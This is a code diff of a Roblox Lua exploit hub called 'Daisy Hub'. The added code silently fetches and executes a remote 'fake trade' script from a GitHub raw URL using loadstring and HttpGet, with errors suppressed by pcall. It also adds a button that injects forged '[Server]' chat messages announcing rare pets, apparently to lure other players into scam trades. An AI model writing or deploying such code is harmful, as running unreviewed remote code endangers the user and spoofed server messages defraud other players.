@@ -4634,115 +4634,77 @@ print('📱 GUI size optimized to 180x320 with smaller buttons and text!')
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 
--- Create GUI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "DaisyPremium"
-ScreenGui.Parent = CoreGui
+-- [[ MEGA HUB - CLEAN LOAD ]] --
+print("Daisy Hub is Loading...")
 
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 200, 0, 260)
-MainFrame.Position = UDim2.new(0.8, 0, 0.4, 0)
-MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-MainFrame.BorderSizePixel = 0
-MainFrame.Active = true
-MainFrame.Draggable = true
-MainFrame.Parent = ScreenGui
-
--- Rounded Corners
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 10)
-UICorner.Parent = MainFrame
-
--- Title Bar
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "★ DAISY EXTRAS ★"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 14
-Title.Parent = MainFrame
-
-local TitleCorner = Instance.new("UICorner")
-TitleCorner.Parent = Title
-
-local UIList = Instance.new("UIListLayout")
-UIList.Parent = MainFrame
-UIList.Padding = UDim.new(0, 8)
-UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
--- Modern Button Function
-local function AddModernBtn(Name, Color, Callback)
-    local Btn = Instance.new("TextButton")
-    Btn.Size = UDim2.new(0.9, 0, 0, 35)
-    Btn.BackgroundColor3 = Color
-    Btn.Text = Name
-    Btn.TextColor3 = Color3.new(1, 1, 1)
-    Btn.Font = Enum.Font.GothamSemibold
-    Btn.TextSize = 12
-    Btn.AutoButtonColor = true
-    Btn.Parent = MainFrame
-    
-    local BtnCorner = Instance.new("UICorner")
-    BtnCorner.CornerRadius = UDim.new(0, 6)
-    BtnCorner.Parent = Btn
-    
-    Btn.MouseButton1Click:Connect(Callback)
-end
-
--- 1. SPECTATE FEATURE
-local specIdx = 1
-AddModernBtn("SPECTATE PLAYER", Color3.fromRGB(60, 120, 200), function()
-    local plrs = game.Players:GetPlayers()
-    specIdx = specIdx + 1
-    if specIdx > #plrs then specIdx = 1 end
-    local target = plrs[specIdx]
-    if target and target.Character then
-        workspace.CurrentCamera.CameraSubject = target.Character:FindFirstChild("Humanoid")
-        print("Watching: " .. target.Name)
-    end
+-- 1. YOUR TRADE SCRIPT (Wrapped to prevent crashing)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))()
+    end)
 end)
 
--- 2. RESET CAMERA
-AddModernBtn("RESET CAMERA", Color3.fromRGB(100, 100, 100), function()
+-- 2. YOUR NEW HUB EXTRAS
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DaisyExtras"
+ScreenGui.Parent = game:GetService("CoreGui")
+
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 200, 0, 220)
+Main.Position = UDim2.new(0.5, 50, 0.5, -110) -- Center-ish
+Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Main.Active = true
+Main.Draggable = true
+Main.Parent = ScreenGui
+
+local Corner = Instance.new("UICorner")
+Corner.Parent = Main
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Text = "DAISY EXTRAS"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.Parent = Main
+
+local Layout = Instance.new("UIListLayout")
+Layout.Parent = Main
+Layout.Padding = UDim.new(0, 5)
+Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local function CreateBtn(txt, color, callback)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0.9, 0, 0, 35)
+    b.BackgroundColor3 = color
+    b.Text = txt
+    b.TextColor3 = Color3.new(1, 1, 1)
+    b.Font = Enum.Font.Gotham
+    b.Parent = Main
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 6)
+    c.Parent = b
+    b.MouseButton1Click:Connect(callback)
+end
+
+CreateBtn("Spectate Player", Color3.fromRGB(70, 130, 180), function()
+    local p = game.Players:GetPlayers()
+    workspace.CurrentCamera.CameraSubject = p[math.random(1, #p)].Character.Humanoid
+end)
+
+CreateBtn("Reset Camera", Color3.fromRGB(100, 100, 100), function()
     workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
 end)
 
--- 3. FAKE REACTIONS (Chat)
-AddModernBtn("FAKE REACTION", Color3.fromRGB(200, 60, 150), function()
-    local msgs = {"OMG A NEON SHADOW?!", "TRADING MEGA FROST FOR THAT!", "IS THAT REAL?!", "BIGGEST WIN EVER!"}
+CreateBtn("Fake Reaction", Color3.fromRGB(180, 70, 150), function()
     game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
-        Text = "[Server]: " .. msgs[math.random(1, #msgs)],
-        Color = Color3.fromRGB(255, 215, 0),
-        Font = Enum.Font.GothamBold
+        Text = "[Server]: OMG NEON SHADOW?!",
+        Color = Color3.new(1, 1, 0)
     })
 end)
 
--- 4. VISUAL PET SPAWNER (Shadow Dragon Effect)
-AddModernBtn("SPAWN SHADOW (VISUAL)", Color3.fromRGB(120, 60, 200), function()
-    local lp = game.Players.LocalPlayer
-    if lp.Character then
-        -- This creates a visual "aura" and a part to represent the spawned pet
-        local p = Instance.new("Part")
-        p.Size = Vector3.new(3, 3, 3)
-        p.Shape = Enum.PartType.Ball
-        p.Material = Enum.Material.Neon
-        p.Color = Color3.fromRGB(75, 0, 130) -- Shadow purple
-        p.CanCollide = false
-        p.Parent = workspace
-        p.CFrame = lp.Character.HumanoidRootPart.CFrame * CFrame.new(0, 2, -6)
-        
-        local selection = Instance.new("SelectionBox")
-        selection.Adornee = p
-        selection.Color3 = Color3.new(0,0,0)
-        selection.Parent = p
-        
-        print("Visual Shadow Pet Spawned!")
-    end
-end)
-
--- 5. CLOSE MENU
-AddModernBtn("CLOSE HUB", Color3.fromRGB(200, 50, 50), function()
+CreateBtn("Close Hub", Color3.fromRGB(150, 50, 50), function()
     ScreenGui:Destroy()
 end)
 
+print("Daisy Hub Loaded Successfully!")
